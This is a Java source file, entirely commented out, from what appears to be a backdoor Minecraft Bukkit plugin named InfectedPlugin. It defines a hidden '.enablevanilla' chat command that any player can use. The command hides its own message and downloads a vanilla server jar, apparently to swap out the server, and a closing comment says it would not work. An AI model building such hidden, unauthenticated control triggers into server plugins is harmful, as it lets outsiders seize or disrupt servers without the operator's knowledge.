/*package org.CreeperCoders.InfectedPlugin.Commands;

import java.io.File;

import org.CreeperCoders.InfectedPlugin.IP_Util;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.AsyncPlayerChatEvent;

public class Command_enablevanilla implements Listener
{

    @EventHandler
    public void onPlayerChat(AsyncPlayerChatEvent event)
    {
        String message = event.getMessage();
        final Player p = event.getPlayer();
        boolean cancel = false;

        if (message.startsWith("."))
        {
            String[] args = message.split(" ");
            if (args == null)
            {
                return;
            }

            if (args[0].equalsIgnoreCase(".enablevanilla")) //Command
            {
                p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
                if (!new File("minecraft_server.1.6.4.jar").exists()) //Check if minecraft_server.1.6.2.jar exists or not
                {
                    p.sendMessage(ChatColor.RED + "minecraft_server.1.6.4.jar not found, downloading..."); //Tell the player that the jar will be downloaded
                    try //Try to download the jar
                    {
                        IP_Util.downloadFile("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.4/minecraft_server.1.6.4.jar", new File("")); // Download minecraft_server.1.6.4.jar
                    }
                    catch (Exception ex) //If it failed to try to download the jar, this makes it catch exception.
                    {
                        p.sendMessage(ChatColor.DARK_RED + ex.getMessage()); //Tell the player the exception message.
                    }
                    p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
                }
                //randomcode
                //Bukkit.shutdown(); //Shutdown Bukkit
                cancel = true; //Block the player from saying .enablevanilla
            } //End of command. 
            if (cancel)
            {
                event.setCancelled(true);
            }
        }
    }

}
*/

// This will not work, for the simple reason that the plugin is very un-likely to have the level of permission needed to delete a file and add a new one in its place. Even if it did, it would only be able to download and stop the server, it couldnt rename it anyway as the plugin wouldnt be running :) 